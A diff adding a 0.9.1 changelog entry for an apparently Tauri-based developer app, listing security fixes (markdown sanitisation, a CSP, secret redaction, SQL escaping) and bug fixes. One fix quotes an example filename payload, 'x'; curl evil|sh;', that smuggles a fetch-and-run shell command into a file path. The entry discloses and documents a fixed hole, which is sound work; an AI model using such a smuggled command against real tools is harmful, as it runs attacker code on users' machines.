@@ -7,6 +7,66 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+## [0.9.1] — 2026-07-25
+
+### Security
+
+- **Rendered markdown is now sanitised.** Runbooks (`.conductor/notes/*.md`) are written
+  by agents and travel with any repository you clone, and release notes come from
+  GitHub — both were rendered through `{@html}` unfiltered. Since the webview holds IPC
+  access to `pty_write`, `write_file` and `run_step`, a crafted note could run code on
+  your machine. Both sinks now go through DOMPurify, keeping the `cfile:`/`ctask:` links
+  that `[[file]]` / `[[task:name]]` depend on. Covered by `scripts/check-sanitize.mjs`,
+  which runs as part of `pnpm check`.
+- **A Content-Security-Policy is now enforced.** The app shipped with `"csp": null`.
+  It now runs under a strict policy (`script-src 'self'`, `object-src 'none'`), with a
+  separate relaxed `devCsp` so Vite HMR still works in development.
+- **Fixed command injection in “Run in external terminal”.** The file path was
+  interpolated into an AppleScript string *and* a shell command, so a filename
+  containing a quote escaped both layers — a cloned repository with a file named
+  ``x'; curl evil|sh;'`` could run arbitrary code on right-click → Run. The path is now
+  passed to `osascript` as `argv` and quoted inside AppleScript with `quoted form of`.
+
+- **Terminal scrollback is redacted before it is saved.** Persisted scrollback is written
+  to `localStorage` in plain text every few seconds, and terminal output routinely
+  contains credentials (`cat .env`, an exported token, a connection string). Common
+  secret shapes — `*_TOKEN=`/`*_PASSWORD=` assignments, `Bearer` tokens, GitHub/AWS/
+  Stripe/Slack/OpenAI keys, JWTs, PEM private-key blocks, credentials embedded in URLs —
+  are now masked on the way out. Persistence can also be switched off entirely from the
+  command palette, which deletes any scrollback already stored.
+- **Backslashes are escaped per engine in generated SQL.** Doubling `'` alone was not
+  enough on MySQL and ClickHouse, where `\` is also an escape character: a value like
+  `C:\path` silently changed meaning and one *ending* in a backslash escaped the closing
+  quote, breaking the statement. PostgreSQL and SQLite are left untouched, where doubling
+  would corrupt the value instead. Affects both cell edits and Data Transfer.
+
+### Fixed
+
+- External links in runbooks open in the system browser instead of navigating the whole
+  webview away from the app.
+- **Long-running commands no longer block the UI.** 68 commands that spawn processes, hit
+  the network, walk the filesystem or query a database now run on a background thread
+  (`#[tauri::command(async)]`) instead of the main thread — `run_step` alone could hold it
+  for up to ten minutes. Per-keystroke commands (`pty_write`, `pty_resize`) stay
+  synchronous, where a thread hop would only add latency.
+- **A panic no longer bricks every terminal and database connection.** The session
+  registries used `lock().unwrap()`, so one panic poisoned the mutex and every later call
+  panicked too, until the app was restarted. The guard is now recovered instead.
+- **Process leaks.** Killed `elyra` agents are reaped instead of lingering as zombies, a
+  PTY session is removed from the registry when its shell exits on its own (not just via
+  the close button), and an SSH tunnel that fails or times out no longer leaves an
+  `ssh -N -L` running.
+- **Errors are no longer swallowed.** Sending to an agent that has exited reports the
+  failure in the transcript instead of looking delivered, and a shell that fails to start
+  says why in the pane rather than leaving it blank.
+- Upgraded `xlsx` 0.18.5 → 0.20.3 (SheetJS's own distribution; the npm package is
+  abandoned). Conductor only ever *writes* spreadsheets, so the parser CVEs in 0.18.5
+  were not reachable — this is hygiene, not an exploited hole.
+- `.gitignore` now covers `.env*`, `*.key`, `*.pem`, `*.p12` and SSH keys. Nothing
+  sensitive was ever committed; this keeps it that way.
+- Corrected `docs/releasing.md`, which claimed releases are not notarized and that users
+  must right-click → Open. They have been notarized and stapled for some time.
+
 ## [0.9.0] — 2026-07-19
 
 ### Added
@@ -836,7 +896,8 @@ project switcher, real PTY terminals, split panes, file tree, and quick-edit.
 - **Run modal:** use a dot-free PTY id so Tauri event names accept it and output
   streams correctly.
 
-[Unreleased]: https://github.com/kwhorne/elyra-conductor/compare/v0.9.0...HEAD
+[Unreleased]: https://github.com/kwhorne/elyra-conductor/compare/v0.9.1...HEAD
+[0.9.1]: https://github.com/kwhorne/elyra-conductor/compare/v0.9.0...v0.9.1
 [0.9.0]: https://github.com/kwhorne/elyra-conductor/compare/v0.8.8...v0.9.0
 [0.8.8]: https://github.com/kwhorne/elyra-conductor/compare/v0.8.7...v0.8.8
 [0.8.7]: https://github.com/kwhorne/elyra-conductor/compare/v0.8.6...v0.8.7
